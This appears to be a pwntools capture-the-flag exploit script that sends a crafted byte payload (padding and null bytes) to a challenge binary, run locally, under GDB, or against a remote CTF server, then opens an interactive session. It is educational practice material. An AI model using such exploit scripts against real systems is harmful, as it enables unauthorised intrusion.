from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

gs = '''
break *0x401463
continue
'''


def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('hctf.hackappatoi.com', 10001)
    else:
        return process(e.path)


p = start()

chain = b'C'*16
chain += b'\x00'*16
chain += b'C'*16+b'\x00'

p.sendline(chain)
p.interactive()
